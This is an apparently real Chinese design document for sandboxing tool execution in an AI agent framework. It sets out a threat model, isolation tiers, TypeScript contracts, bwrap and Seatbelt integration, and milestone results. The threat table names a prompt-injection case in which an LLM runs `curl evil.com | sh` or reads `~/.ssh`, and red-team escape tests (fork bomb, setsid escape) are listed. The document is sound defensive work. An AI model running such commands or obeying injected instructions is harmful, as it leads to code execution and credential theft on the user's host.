# Agent 沙箱隔离研发计划（SANDBOX_PLAN）

> 范围：`packages/agent`（aipack agent 框架）
> 状态：设计定稿 / 待排期
> 关联文档：`MCP_PLAN.md`、`multi-agent-design.md`

---

## 1. 背景与目标

### 1.1 背景

当前 agent 的安全模型只有**授权层**（PermissionPolicy）：在工具执行*之前*裁决"能不能执行"。
裁决通过后，工具在宿主 Node 进程内以全量权限运行——可以读写任意文件系统路径、
访问全部环境变量与凭证、发起任意网络连接、派生不受管理的子进程。

授权层拦得住"未授权的调用"，拦不住"授权后的滥用"：

- 提示注入可诱导 LLM 以合法授权做越界操作（如经 shell 工具读取 `~/.ssh`）；
- 恶意项目内容（如恶意 `package.json` script、被注入的源文件）经合法 shell 工具执行；
- 工具失控后无资源约束、无进程回收手段（后台进程残留、磁盘写爆）。

### 1.2 目标

为 agent 增加**隔离层**：工具执行时的强制约束——文件系统边界、网络边界、环境变量
最小化、资源限额、进程生命周期管理。两层职责正交：

```
Permission（已有） = 事前授权：这次调用允不允许
Sandbox（本计划） = 事中约束：允许后在哪个笼子里执行
```

### 1.3 非目标

- 不替代 PermissionPolicy / ApprovalManager，两者保持现有语义不动；
- 不做浏览器内容隔离、MCP server 隔离（MCP 侧另行评估，可复用本层契约）；
- Tier 3（microVM）本期只留接口位，不做实现。

---

## 2. 威胁模型

| #   | 威胁                 | 场景                                          | 现有防线                            | 缺口                          |
| --- | -------------------- | --------------------------------------------- | ----------------------------------- | ----------------------------- |
| T1  | 提示注入滥用授权工具 | LLM 被诱导执行 `curl evil.com \| sh`          | 权限规则可 matchArgs，但规则难穷举  | 无执行期约束                  |
| T2  | 恶意项目内容执行     | agent 在不可信仓库跑构建/测试                 | 无                                  | 无                            |
| T3  | 越界文件访问         | 读写项目目录外路径、窃取 `.env`/`~/.ssh`      | 无                                  | 无                            |
| T4  | 凭证/环境泄漏        | 子进程继承宿主全部 env（含 API key）          | 无                                  | 无                            |
| T5  | 资源失控             | fork 炸弹、磁盘写爆、死循环占核               | 仅 wall-clock 超时（toolTimeoutMs） | 无 CPU/内存/进程数/输出量限额 |
| T6  | 进程残留与持久化     | 工具派生后台进程逃逸超时控制；写入启动项/cron | abort/超时只作用于单进程            | 无进程组管理                  |

**信任边界**：项目工作区内容（文件、脚本、依赖）默认视为不可信输入；
宿主凭证、宿主文件系统、内网默认视为不可触达。

---

## 3. 现状分析

### 3.1 现有安全资产（保留复用）

- `PermissionPolicy`（`packages/agent/core/permission.ts`）：deny-by-default 规则裁决，
  `allow/deny/confirm/pending` 四态决策 + `ApprovalManager` 异步审批（Human-in-the-loop）。
- `ToolExecutor`（`packages/agent/runtime/tool-executor.ts`）：执行链路已清晰分段——
  参数预处理 → 权限裁决 → 审批挂起 → 超时信号 → beforeToolCall → `tool.execute()` → afterToolCall。
  **沙箱的插入点天然存在**：`beforeToolCall` 之后、`tool.execute()` 之前。
- `Tool.permissions` 能力声明（`shell:exec` / `fs:write` / `network:fetch` 等）：
  沙箱策略可按能力声明映射默认约束。
- `withTimeoutSignal` 超时信号管理、`toolResultStatus` 结果分类。
- Telemetry 契约（`packages/agent/core/telemetry.ts`）：可选方法、全吞错，沙箱事件照此风格扩展。

### 3.2 关键缺口

- `tool.execute()` 直接在宿主进程内调用，无任何执行环境隔离；
- `Tool` 接口无执行环境声明，框架无法区分"纯计算"与"接触系统"的工具；
- 无进程生命周期管理（派生子进程不受控）；
- 无资源限额（除 wall-clock 外）。

---

## 4. 总体架构：四层隔离模型

按强度递增分层，**可插拔、按工具选择**，不是全局单一模式：

```
┌────────────────────────────────────────────────────────────┐
│ ToolExecutor.execute()                                     │
│   权限裁决（已有，不动）                                      │
│   → beforeToolCall（已有，不动）                              │
│   → SandboxProvider.run(spec, tool, args, signal)   ← 新增 │
│        │                                                    │
│        ├─ Tier 0  inprocess   进程内加固（受限 facade）       │
│        ├─ Tier 1  subprocess  进程外执行（跨平台基线）         │
│        ├─ Tier 2  os          OS 级沙箱（真正的安全边界）      │
│        └─ Tier 3  microvm     microVM（敌对场景，预留）        │
│   → afterToolCall（已有，不动）                               │
└────────────────────────────────────────────────────────────┘
```

| 层级   | 机制                                                     | 隔离强度                             | 性能开销           | 平台                           | 定位                     |
| ------ | -------------------------------------------------------- | ------------------------------------ | ------------------ | ------------------------------ | ------------------------ |
| Tier 0 | 进程内 facade（路径白名单包装）                          | 弱（非安全边界，防误伤）             | 零                 | 全平台                         | 默认兜底                 |
| Tier 1 | 独立子进程 + env 清洗 + 进程组 kill + 输出封顶           | 中（崩溃/残留/泄漏隔离，非逃逸边界） | spawn ~50-150ms/次 | 全平台                         | **跨平台基线，本期核心** |
| Tier 2 | OS 强制访问控制（namespace/seccomp/Seatbelt/Job Object） | 强（安全边界）                       | 同 Tier 1          | Linux 完整；macOS/Windows 部分 | 本期 Linux 优先          |
| Tier 3 | gVisor / Firecracker / WSL2 VM                           | 最强                                 | 100ms-2s           | Linux/云                       | 仅接口预留               |

**决策规则**：

- 工具声明 `strategy: 'os'` 但平台能力不足 → 降级链 `os → subprocess → inprocess`（每级降级发遥测告警）；
- 严格模式（`enforced: true`）下禁止降级——声明 `os` 的工具在无 OS 沙箱环境直接拒绝执行。

---

## 5. 核心契约设计

### 5.1 新增 `packages/agent/core/sandbox.ts`（契约层）

与 `PermissionPolicy` 同构：接口定义在 core，实现按平台分层，经 `RuntimeOptions` 注入。

```ts
// ─── 执行环境规格 ──────────────────────────────────────────────

export type SandboxStrategy = 'inprocess' | 'subprocess' | 'os' | 'microvm';

/** 文件系统约束：路径前缀白名单（resolve 后规范化匹配） */
export interface SandboxFsSpec {
  /** 可读路径前缀（隐式含自身）。缺省 = 项目工作区 + 工具所需只读区 */
  readable: string[];
  /** 可写路径前缀。缺省 = 项目工作区 + scratch 临时目录 */
  writable: string[];
  /** 显式拒绝路径前缀（优先级高于 readable/writable，如 ~/.ssh、.env） */
  deny?: string[];
}

export type SandboxNetMode = 'deny' | 'allow' | 'proxy';

export interface SandboxNetSpec {
  mode: SandboxNetMode;
  /** proxy 模式下经审计代理放行的域名白名单 */
  hosts?: string[];
}

export interface SandboxResourceSpec {
  wallClockMs?: number; // 墙钟（与 toolTimeoutMs 取 min）
  cpuMs?: number; // CPU 时间（cgroup/Job Object；Tier 1 用负荷采样近似）
  memoryMb?: number; // 内存上限
  processes?: number; // 并发进程数上限（防 fork 炸弹）
  outputBytes?: number; // stdout+stderr 字节数上限（防输出爆炸）
  diskWriteBytes?: number; // 磁盘写入上限（Tier 2+；Tier 1 用输出量近似）
}

export interface SandboxSpec {
  strategy: SandboxStrategy;
  fs: SandboxFsSpec;
  net: SandboxNetSpec;
  /** 显式注入的环境变量。不继承宿主 env（PATH/HOME 由框架注入伪造值） */
  env: Record<string, string>;
  resources: SandboxResourceSpec;
}

// ─── Provider 接口 ─────────────────────────────────────────────

export interface SandboxRunRequest {
  toolName: string;
  toolCallId: string;
  args: unknown;
  spec: SandboxSpec;
  signal: AbortSignal;
  /** 遥测回调（violation / 降级 / 限额触发，provider 内部上报） */
  onEvent?: (event: SandboxEvent) => void;
}

export interface SandboxProvider {
  /** 能力探测：当前平台/环境是否支持该 strategy */
  supports(strategy: SandboxStrategy): Promise<boolean>;

  /** 在 spec 约束下执行工具，返回 ToolResult（兼容现有 resourcesToMessages 契约） */
  run(req: SandboxRunRequest): Promise<ToolResult>;
}

// ─── 沙箱事件（遥测）──────────────────────────────────────────

export type SandboxEventType =
  | 'spawn' // worker 进程启动
  | 'exit' // worker 正常退出
  | 'killed' // 超时/abort/限额触发强杀（含原因）
  | 'violation' // 越界尝试（路径/网络/env 被拦截）
  | 'degraded' // 策略降级（os → subprocess → inprocess）
  | 'limit'; // 资源限额触发（未致死的软限制）

export interface SandboxEvent {
  type: SandboxEventType;
  toolName: string;
  toolCallId: string;
  strategy: SandboxStrategy;
  detail?: Record<string, unknown>;
}
```

### 5.2 `Tool` 接口扩展（`core/types.ts`，最小改动）【已实现】

```ts
// 声明允许 Partial（缺省字段由 mergeSpec 回填默认值），或基于 args 的动态工厂
export type ToolSandboxDeclaration =
  | Partial<SandboxSpec>
  | ((args: unknown, ctx: ToolSandboxContext) => Partial<SandboxSpec>);
export interface ToolSandboxContext {
  workspace?: string;
}

export interface Tool {
  // ...现有字段不动...
  /** 沙箱执行声明（可选）。未声明 = 不进入隔离链路，行为零变化 */
  sandbox?: ToolSandboxDeclaration;
}
```

向后兼容原则：**未声明 `sandbox` 的工具行为零变化**——不经过 provider，直跑。
声明了 `sandbox` 才进入隔离链路。这保证了最小改动与存量生态零迁移成本。

### 5.3 `RuntimeOptions` 扩展（`core/runtime.ts`）

```ts
export interface RuntimeOptions {
  // ...现有字段不动...
  /** 沙箱配置（可选）。未配置时：声明了 sandbox 的工具降级 inprocess 并发遥测告警 */
  sandbox?: SandboxOptions;
}

export interface SandboxOptions {
  provider?: SandboxProvider; // 缺省 = DefaultSandboxProvider（内置 Tier 0/1）
  /** 全局默认覆盖（合并进工具声明的 spec，运行时收紧用） */
  defaults?: Partial<SandboxSpec>;
  /** 严格模式：true 时声明 os/microvm 的工具在能力不足时拒绝执行（不降级） */
  enforced?: boolean;
  /** worker 进程加载的工具模块路径（Tier 1 用，M2 接线；缺省自动收集内置工具模块） */
  toolModules?: string[];
}
```

**与权限层的 fail-open/fail-closed 对齐说明**：权限层默认 fail-closed（拒绝），
因为它是*授权*；沙箱层默认 fail-open（降级放行 + 告警），因为它是*加固*，
授权层仍是安全底线。严格场景同时开 `permissionPolicy + sandbox.enforced`。

### 5.4 合并顺序【已实现，见 core/sandbox.ts mergeSpec】

```
最终 spec = mergeSpec(SandboxOptions.defaults, resolveToolSandbox(tool.sandbox, args), workspace)
```

收紧语义（运行时只能比工具声明更严，不能更宽）：

- `strategy`：取隔离强度更高者（`inprocess < subprocess < os < microvm`）——
  运行时基线不可被工具声明降级；双方都缺省回填 `subprocess`（跨平台基线）；
- `fs.readable/writable`：工具侧缺省回填 `[workspace]`（无 workspace → `[]`），
  defaults 侧定义时取**交集**（= 工具需要 ∩ 运行时允许，丢弃越界路径）；
- `fs.deny`：**并集**（更严 = 更多拒绝），归一去重；
- `net.mode`：取更严值（`deny < proxy < allow`）；双方都缺省回填 `deny`
  （deny-by-default）；`net.hosts` 双方都定义取大小写不敏感交集，单方取单方；
- `env`：`{ ...defaults, ...tool }`（工具逐键覆盖——非收紧字段；
  框架保留变量 PATH/HOME 等由 provider 白名单构造，spec.env 不可覆盖，M2 接线）；
- `resources`：逐字段取双方都定义时的 **min**（更严），仅保留有值字段。

路径匹配（`isPathWithin`）：词法前缀匹配（分隔符归一、win32 大小写不敏感、
按段边界防 `/ab` 误命中 `/abc`），不做 IO——`..`/symlink/8.3 短名的消解是
provider 侧（M2 facade）的职责。

### 5.5 导出【已实现：core/index.ts + 包根 index.ts 双导出】

```ts
export { mergeSpec, resolveToolSandbox, isPathWithin } from './sandbox';
export type {
  SandboxStrategy,
  SandboxSpec,
  SandboxFsSpec,
  SandboxNetSpec,
  SandboxResourceSpec,
  SandboxProvider,
  SandboxRunRequest,
  SandboxOptions,
  SandboxEvent,
  SandboxEventType,
  SandboxNetMode,
  ToolSandboxDeclaration,
  ToolSandboxContext,
} from './sandbox';
export { createDefaultSandboxProvider } from './runtime/sandbox'; // M2 已提供（工厂从 runtime 层导出，契约仍在 core）
```

---

## 6. Tier 1 详细设计：subprocess provider（本期核心）

### 6.1 进程模型

- **每次工具调用 spawn 一个 worker 进程**（Node 子进程），执行完毕即退出。
  隔离优先，池化优化后置（M8，见 §10）。
- 通信：stdin/stdout 上的 **NDJSON 消息协议**；stderr 仅用于诊断日志。
- worker 入口：包内新增 `sandbox/worker.ts`（构建产物 `sandbox/worker.js`），
  以 `node <pkg-dist>/sandbox/worker.js` 启动，**不经宿主进程 spawn 内联脚本**，
  保证 worker 代码可信且版本一致。

### 6.2 工具跨进程加载（关键可行性约束）

**问题**：闭包式工具（运行时 `execute` 函数）无法跨进程传递。

**方案**：worker 不接收工具函数，而是**按名字加载同一工具注册表**：

1. 框架内置工具全部从具名模块注册（现状已基本如此），worker 启动时按配置
   `toolModules: string[]`（模块路径）import 并重建注册表；
2. `RuntimeOptions.sandbox.toolModules` 缺省自动收集内置工具模块；
3. 声明了 `sandbox` 的工具若 worker 内无法解析（第三方闭包工具）→
   返回 error ToolResult + `degraded` 事件，提示工具作者改用具名模块注册。

### 6.3 NDJSON 协议

```
宿主 → worker（stdin, 首行握手后单请求）:
  {"op":"init","toolModules":[...],"spec":{...}}
  {"op":"exec","toolName":"shell","toolCallId":"tc_...","args":{...}}

worker → 宿主（stdout, 每行一条）:
  {"op":"ready"}                                     // 注册表就绪
  {"op":"event","type":"violation","detail":{...}}    // 流式事件（透传遥测）
  {"op":"result","toolResult":{...}}                  // 终止消息
  {"op":"error","message":"...","code":"..."}         // 异常终止
```

- 结果封装为 `ToolResult`，天然兼容 `resourcesToMessages` 往返契约（见项目硬约束）；
- `op:result` 后 worker 自行退出（宿主不依赖但会兜底 kill）。

### 6.4 环境清洗

worker 进程 env = **白名单构造**，不继承宿主：

```
PATH   = worker 运行时所需最小路径（node 目录 + 系统路径，不含宿主自定义）
HOME   = <sandbox-home>/  （每调用临时目录，调用后清理）
TMPDIR = <sandbox-home>/tmp
SYSTEMROOT 等 Windows 系统必需变量（按平台枚举硬编码清单）
+ spec.env 显式注入项（逐项审计）
```

### 6.5 进程组管理

- POSIX：`spawn(..., { detached: true })` 创建新进程组，kill 时 `process.kill(-pid, 'SIGKILL')`；
- Windows：超时/abort 时 `taskkill /PID <pid> /T /F`（递归杀树）；
- 触发条件（三选一即杀）：`signal` abort / `wallClockMs` 超时 / worker 心跳丢失
  （worker 每 5s 写 `op:event{type:'heartbeat'}`，宿主 15s 无消息判定僵死）。

### 6.6 资源近似限额（Tier 1 语义）

- `outputBytes`：宿主侧对 stdout/stderr 累计计数，超限 kill + 截断结果；
- `processes`：Tier 1 无法精确限制（无 OS 配额），采用**事后审计**——
  worker 退出后枚举其派生进程残留（`ps --ppid` / WMI `ParentProcessId`），
  发现残留即 kill 并发 `violation` 事件；精确配额留 Tier 2；
- `memoryMb` / `cpuMs`：Tier 1 仅监控告警（`ps`/WMI 轮询 worker RSS），
  超限 kill；精确硬限留 Tier 2。

### 6.7 fs 约束（Tier 1 语义）

Tier 1 无 OS 强制，fs 边界为**软约束**（worker 内 facade）：

- worker 进程内的 `fs` 模块被包装（`require`/`import` 拦截）：open/stat/watch
  经 `SandboxFs.check(path, mode)` 校验；
- 校验规则：`path.resolve` → `fs.realpath`（解析 symlink）→ 与 `readable/writable/deny`
  前缀匹配（Windows 大小写不敏感；realpath 已消解 8.3 短名与 `..`）；
- 写操作额外校验 resolve 后路径仍可写（防 symlink TOCTOU 尽力而为，
  完整消解需 Tier 2 mount 边界）。

> 明确声明：Tier 1 的 fs 约束可被 `child_process` 直接绕过（子进程不经 facade），
> 因此**软约束只为拦截误操作与提供审计信号，硬边界由 Tier 2 提供**。
> 文档与代码注释必须如实标注这一点，避免使用者误判安全强度。

---

## 7. Tier 2 详细设计：OS 级沙箱

### 7.1 平台矩阵

| 平台    | 机制                                                                    | fs 边界                                                                     | 网络边界                                          | 资源配额                                 | 落地优先级     |
| ------- | ----------------------------------------------------------------------- | --------------------------------------------------------------------------- | ------------------------------------------------- | ---------------------------------------- | -------------- |
| Linux   | bubblewrap（bwrap）+ 可选 systemd-run                                   | mount namespace：`--ro-bind` 只读根 + `--bind` 项目可写 + `--tmpfs` scratch | `--unshare-net`（deny）；allow 场景出网经宿主代理 | cgroup v2（cpu.max/memory.max/pids.max） | **P0（本期）** |
| macOS   | `sandbox-exec` Seatbelt profile                                         | `(allow file-read*)` 白名单 + `deny` 其余                                   | `(deny network*)` 或 allowlist 域名               | 无原生配额，用 `ulimit` + 轮询           | P1（下期）     |
| Windows | Job Object（资源配额）+ 受限令牌（访问控制）；强隔离走 WSL2/Docker 后端 | 受限令牌 ACL 或 WSL2 内 mount                                               | 受限令牌防火墙规则或代理                          | Job Object（内存/CPU/进程数硬配额）      | P1（下期）     |

### 7.2 Linux bwrap 集成要点

- provider 探测 `bwrap --version`，不可用 → 降级 subprocess + `degraded` 事件；
- 命令模板（概念示意，实现时按 spec 生成）：

```bash
bwrap \
  --ro-bind /usr /usr --ro-bind /bin /bin --ro-bind /lib /lib ... \
  --proc /proc --dev /dev --tmpfs /tmp \
  --bind <workspace> <workspace> --chdir <workspace> \
  --setenv HOME <sandbox-home> --clearenv \
  --unshare-net --unshare-pid --die-with-parent \
  systemd-run --scope -p MemoryMax=<mb> -p CPUQuota=<...> -p TasksMax=<n> \
  node <worker.js>
```

- `--die-with-parent` 保证宿主崩溃时沙箱进程自动消亡；
- 降级链处理：无 cgroup v2 时跳过 systemd-run 直跑 bwrap（丢配额保边界），
  无 bwrap 时跳过整个 Tier 2。

### 7.3 网络代理（M6，独立子任务）

- `net.mode: 'deny'`：Linux 走 `--unshare-net`（强保证）；
- `net.mode: 'proxy'`：宿主进程内启动本地 HTTP(S) forwarder（127.0.0.1 随机端口），
  worker env 注入 `HTTP_PROXY/HTTPS_PROXY`，forwarder 按 `hosts` 白名单放行，
  **全量请求审计日志**（域名、方法、大小，不记 body）；
- `net.mode: 'allow'`：直连（仅限显式声明，发遥测告警提示收敛）。

### 7.4 凭证代理（Secrets Broker，M6）

原则：**沙箱环境内永远不存在全量凭证**。

- 宿主进程持有 API key 等凭证；worker 需要时经 stdin 协议发起
  `{"op":"request-secret","name":"ANTHROPIC_API_KEY"}`；
- 宿主裁决：该凭证是否在本次调用的授权范围内（`spec.env.secrets` 白名单）→
  单条发放 → worker 注入自身 env；
- 未经声明的凭证请求 → 拒绝 + `violation` 事件；
- 宿主崩溃/调用结束，worker 随之消亡，凭证不残留（配合 scratch 目录清理）。

---

## 8. Tier 3：microVM（仅接口预留）

- 契约已覆盖（`strategy: 'microvm'`），实现留空；
- 候选后端：gVisor（runsc，OCI 兼容）、Firecracker（云）、WSL2/Docker（Windows）；
- 触发条件设想：未来"执行不可信仓库测试"模式、多租户服务化场景；
- `supports('microvm')` 默认返回 false，enforced 模式下声明 microvm 的工具直接拒绝。

---

## 9. 遥测与审计

### 9.1 新增 Telemetry 事件（可选方法，沿用现有吞错风格）

```ts
// core/telemetry.ts 扩展
export interface SandboxTelemetryInfo {
  traceId: string;
  spanId: string;
  sessionKey: string;
  toolName: string;
  event: SandboxEvent; // §5.1 定义
}
// Telemetry 接口新增：onSandboxEvent?(info): void | Promise<void>
```

### 9.2 审计持久化

- `violation` / `killed` / `degraded` 三类事件除遥测外，写入运行日志
  （复用 CLI 侧 `--debug` 日志通道，不新增存储面）；
- 审批（Approval）与沙箱事件通过 traceId 关联，可回溯"谁批准 → 沙箱内发生了什么"。

---

## 10. 实施计划

依赖关系：M1 → M2 → M3 → M4 → M6；M5/M7 可并行；M8 收尾优化。
工作量标注：S = 小（≤3 天）/ M = 中（约 1 周）/ L = 大（≥2 周），不含缓冲。

### M1 契约层（S，先行）✅ 已完成（2026-10-16）

| 任务                                                               | 产出            |
| ------------------------------------------------------------------ | --------------- |
| 新建 `core/sandbox.ts`：全部类型 + `mergeSpec`（含收紧语义）+ 单测 | 类型文件 + 测试 |
| `Tool.sandbox` 可选字段（`core/types.ts`）                         | 最小 diff       |
| `RuntimeOptions.sandbox` + `SandboxOptions`（`core/runtime.ts`）   | 最小 diff       |
| `core/index.ts` 导出                                               | 导出清单        |

**验收**：类型检查通过；`mergeSpec` 单测覆盖交集/min/更严值语义；
未配置 sandbox 的现有测试**全量绿**（零行为变化证明）。

### M2 subprocess provider（M，核心）✅ 已完成（2026-10-16）

| 任务                                                                       | 产出        |
| -------------------------------------------------------------------------- | ----------- |
| `runtime/sandbox/subprocess.ts`：spawn/协议/心跳/kill 树/env 清洗/输出封顶 | provider    |
| `runtime/sandbox/worker.ts` + 构建配置（tsup 多入口）                      | worker 入口 |
| worker 内 fs facade（软约束）+ 注册表重建（toolModules）                   | worker 内核 |
| `createDefaultSandboxProvider()`（Tier 0/1 路由 + 降级链 + supports 探测） | 工厂        |

**验收**：集成测试——shell 类工具经 provider 执行成功；abort/超时后无残留进程
（Windows/POSIX 双平台进程树检查）；env 清洗断言（worker 内读不到宿主自定义变量）；
输出超限被截断；闭包工具降级路径返回明确 error。✅ `test/sandbox-subprocess.test.ts`
17 用例全绿（Windows 平台），全量套件 550/550。

**实现偏差**（与原设计的差异）：

- **新增 `runtime/sandbox/fs-hook.ts`**（原设计未预见）：CJS exports patch 只能覆盖
  require / default import / namespace 属性访问，ESM named import
  （`import { readFileSync } from 'node:fs'`）是实例化时的快照绑定，绕过 patch。
  worker 顶层经 `module.register` 注册 resolve/load hook，将 fs 相关 specifier
  重定向到动态生成的 facade 模块（named export 在工具模块 import 时刻对
  patched 函数求值快照）。构建入口 `sandbox/fs-hook`，与 worker 同目录部署。
- **memoryMb/processes 轮询审计未实现**（原设计 Tier 1 可选项）：按零依赖原则
  （R4）与 Windows 原生方案（Job Object）并入 M4 一并评估，避免 ps/WMI 轮询的
  平台碎片代码先行。
- **inprocess 请求到达 provider = 显式 error**：进程内直跑不经 provider
  （由 ToolExecutor 路由，M3 接线），到达即路由错误，返回 error + degraded
  事件（显式失败优于静默降级）。
- **worker 环境变量哨兵**：AIPACK_SANDBOX_WORKER / NODE_OPTIONS 等宿主变量
  均不进 worker env（buildWorkerEnv 白名单构造，测试断言覆盖）。
- 协议层心跳为独立 op（非 SandboxEventType 遥测事件），僵死判定从 worker
  首条 stdout 消息激活计时（保护 spawn/加载间隙，wallClock 兜底）。

### M3 ToolExecutor 接入（S）✅ 已完成（2026-10-16）

| 任务                                                                         | 产出      |
| ---------------------------------------------------------------------------- | --------- |
| `ToolExecutor.execute()` 插入 provider 路由（beforeToolCall 后、execute 前） | 最小 diff |
| `ToolExecutorDeps` 注入 provider/spec 合并/enforced 配置                     | 依赖注入  |
| 遥测事件接线（onSandboxEvent）+ 单测                                         | 事件      |

**验收**：现有 `tool-hooks` / `permission` / `approval` 测试全绿（钩子改写 args、
审批挂起等行为不受影响）；声明 sandbox 的工具经沙箱执行且结果消息兼容
`resourcesToMessages` 往返（项目硬约束回归项）。✅ `test/tool-sandbox.test.ts`
13 用例全绿，全量套件 563/563。

**实现说明**（与原设计的细化）：

- 路由位置：权限裁决 + 审批挂起 + beforeToolCall（含 args 改写）之后、
  `tool.execute()` 之前——沙箱 spec 解析/合并使用**改写后的 args**（工厂形
  声明按实际执行参数授权）；
- `inprocess` 策略不经 provider 直跑（Tier 0 定位：进程内零开销）；到达
  provider 的 inprocess 请求 = 路由错误（M2 default provider 显式 error）；
- 未配置 `RuntimeOptions.sandbox`：声明工具降级 inprocess 直跑 +
  degraded 遥测告警（reason: no-sandbox-configured，fail-open）；
- `enforced: true`：supports 探测失败 → blocked 结果（details.blocked）+
  degraded 告警，不降级不直跑；
- `provider.run` 抛错 → error 工具结果兜底（沙箱基础设施故障不炸 run）；
- 遥测：`SandboxTelemetryInfo`（core/telemetry.ts 可选方法，全吞错风格一致），
  provider 事件与本层降级事件共用 `onSandboxEvent` 出口；
- 缺省 provider 惰性构建（首次命中声明工具时 createDefaultSandboxProvider，
  toolModules 透传）。

### M4 Linux OS 沙箱（M）✅ 已完成（2026-10-16，Linux 真跑已在容器验证通过）

| 任务                                                          | 产出     |
| ------------------------------------------------------------- | -------- |
| `runtime/sandbox/bwrap.ts`：命令生成 + 能力探测 + cgroup 集成 | provider |
| fs spec → bwrap 参数映射（ro-bind/bind/deny 不可见路径）      | 映射器   |
| 资源配额接线（memory/cpu/pids）                               | 配额     |
| §11.3 红队逃逸用例（net/fork/setsid/deny/env）                | 测试     |

**验收**：`test/sandbox-os.test.ts` 全部用例（15 全平台纯函数 + 2 个 Linux-only
集成 + 6 个 §11.3 红队 Linux 真跑）**已在 Docker 容器（node:20-slim + bwrap
0.8.0）全部通过**：net deny（隔离 netns 内宿主监听端口不可达）、net allow 对照、
fork 炸弹（wallClock kill 后 /proc 扫描零残留）、setsid 后台逃逸（die-with-parent
内核级清场）、deny 路径遮蔽（SENTINEL 不可读）、env clearenv（宿主变量清除 +
spec.env 注入可见）。无 bwrap 环境 supports=false 如实降级。

**真跑暴露并修复的问题**（Linux 容器首跑 9 fail → 修复后全绿）：

1. **worker 构建产物不自包含**：tsup splitting 把 worker 依赖打到 dist 根
   chunk，bwrap 最小挂载面内不可见 → ERR_MODULE_NOT_FOUND。修复：worker 与
   fs-hook 拆为独立单入口构建（self-contained）；
2. **挂载顺序 bug**：`--tmpfs /tmp` 在 infra bind 之后 → /tmp 下的
   toolModules/workspace 被 tmpfs 遮蔽。修复：proc/dev/tmp 基础设施挂载移至
   一切数据面 bind 之前（bwrap 按命令行顺序挂载，后挂遮蔽先挂）；
3. **容器 root 无 CAP_SYS_ADMIN**：bwrap 默认直接 unshare(CLONE_NEWNS) →
   EPERM。修复：显式 `--unshare-user`（unprivileged 路径，非 root 桌面场景
   与 bwrap 默认一致）；
4. **probe 语义**：`--version` 只证二进制存在，userns 被容器 seccomp 封锁时
   运行时才爆。修复：`probeBwrapSandbox()` 以真实构造沙箱验证（探测形态与
   执行一致），封锁环境 supports 如实 false → 降级而非运行时失败；
5. **测试设计缺陷**（修测试非实现）：net deny 需宿主侧真监听才能区分隔离与否；
   deny 断言接受 facade/内核双层拦截；supports 用例存在分支外引用未定义变量
   （仅 Linux 真跑暴露）；红队 fixture 需显式 import node:net。

**实现说明**（与原设计的细化）：

- **协议状态机共用**：subprocess.ts 抽出 `runProtocolSession`（spawn/NDJSON 流/
  心跳/限额/kill/清理），Tier 1 与 Tier 2 共用；会话事件 strategy 取实际 spec
  （os 下 worker 自发事件也报 'os'）；
- **挂载面**：系统目录（/usr /bin /sbin /lib /lib64 /etc /opt /run，存在性探测）
  只读 + `--proc/--dev/--tmpfs /tmp`（先于一切数据面 bind）；node/worker/
  toolModules 所在目录 ro-bind（基础设施可见性，非数据面授权）；
  readable → `--ro-bind`、writable → `--bind`，已被更强前缀覆盖的路径去重；
- **deny 遮蔽**（挂载序末尾覆盖）：目录 → `--tmpfs <path>`；文件 → 宿主空文件
  ro-bind 覆盖（会话后清理）；宿主不存在且未被覆盖的 deny 路径本就不可见，跳过；
- **网络**：deny/proxy → `--unshare-net`（proxy 的 broker 是 M6，未实现前保守
  断网）；allow → 不加 unshare（直连）；
- **配额**：`probeLinuxSandboxCaps()`（缓存）探测 bwrap（真实验证形态）/
  cgroup v2/systemd-run；可用时 `systemd-run --scope -p MemoryMax/CPUQuota/
TasksMax`（cpuMs 语义 = 每秒 CPU 预算毫秒 → 百分比），不可用直跑 bwrap
  （丢配额保边界；容器场景 cgroup 挂载面受限，配额路径待 systemd CI 验证）；
- **能力路由**：default provider `supports('os')` = Linux + bwrap；不可用时
  os → subprocess、microvm → os（可用时）→ subprocess，逐级 degraded 事件；
- `probeLinuxSandboxCaps` 同时服务于 M7 的 `aipack doctor` 沙箱能力检测。

### M5 Windows/macOS OS 层（M，可后置）✅ 已完成（2026-10-16，darwin 真跑待 macOS 环境验证）

| 任务                                                                      | 产出     |
| ------------------------------------------------------------------------- | -------- |
| Windows Job Object 评估（原生依赖 vs 审计顶替）                           | 评估结论 |
| `runtime/sandbox/audit-win.ts`：进程树事后审计（memory/processes → kill） | 审计器   |
| `runtime/sandbox/seatbelt.ts`：Seatbelt profile 生成 + provider           | provider |
| default provider 平台分派（Linux → bwrap，macOS → Seatbelt）              | 路由     |

**Windows Job Object 评估结论**（不引入原生依赖）：Job Object 配额需 Win32 API
（CreateJobObject / SetInformationJobObject），Node 生态无维护良好的零依赖封装；
手写 N-API 或 koffi-FFI 均引入原生依赖，违背零依赖原则（R4），且 x64/arm64
prebuilds 发布链复杂度与收益不成比例。**采纳"进程树事后审计"顶替**（如实声明
语义差距：事后审计非内核硬配额，超限前的时间窗口内无强制）。

**验收**：audit-win 纯函数（CSV 转义/树聚合/阈值判定）、Seatbelt profile 生成
纯函数、能力探测全平台测试通过；Windows 真进程审计集成用例（声明 `processes: 0`
/ `memoryMb: 0` 极限值 → 1s 周期采样 ~5s 内 kill + `process-limit`/`memory-limit`
事件）本机通过；darwin 真跑 sandbox-exec 留 macOS 环境校准（`test/sandbox-m5.test.ts`
22 用例：21 pass + 1 darwin-only skip）。

**实现说明**（与原设计的细化）：

- **Windows 审计**：声明 `memoryMb`/`processes` 限额时（仅 win32），Tier 1 协议会话
  启用 `ResourceAudit`——PowerShell CIM 全进程表查询（`Get-CimInstance Win32_Process`，
  4s 超时）→ 宿主自 worker pid 沿 ParentProcessId BFS 建树（pid 复用环防御）→
  聚合进程数与 WorkingSetSize → 超限走统一 kill 路径（killed 事件带 reason）；
  采样失败/root 缺表静默跳过（审计不成为故障源）；强杀复用既有 `taskkill /T`；
- **Seatbelt profile**：`(deny default)` 基线 + 进程/syscall 放行（process-exec*、
  mach-lookup 等，**experimental 收敛点**：allow 面需真机校准）+ 系统目录只读 +
  readable/writable/deny 逐路径映射（Seatbelt 最具体规则优先）+ HOME 临时目录读写
  放行；`net.mode === 'allow'` → `(allow network*)`，proxy 已在 M6 落地
  （forwarder remote 地址放行 + env 代理注入，见 M6 实现说明）；
- **macOS env 语义差异**：sandbox-exec 无 `--clearenv` 等价物 → env 白名单由宿主
  spawn 侧构造（复用 `buildWorkerEnv` POSIX 分支），profile 不涉及 spec.env；
  Seatbelt 无资源配额原语（memory/processes 依赖 cgroup 类机制），macOS 不施加
  并如实声明；
- **平台分派**：`createDefaultSandboxProvider` 内 `osProvider = darwin ? seatbelt
: bwrap`，supports/run/降级链统一经 osProvider 路由。

